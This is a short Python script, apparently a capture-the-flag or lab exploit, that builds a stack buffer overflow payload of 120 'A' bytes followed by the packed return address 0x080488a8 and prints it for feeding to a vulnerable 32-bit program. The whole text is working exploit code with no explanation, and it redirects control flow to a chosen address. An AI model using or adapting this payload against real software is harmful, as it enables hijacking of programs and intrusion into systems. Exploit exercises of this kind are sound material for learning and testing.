#!/usr/bin/python

from struct import pack

target=0x080488a8
overflow=120

buff=b"A"*overflow+pack("<I",target)

print(buff)


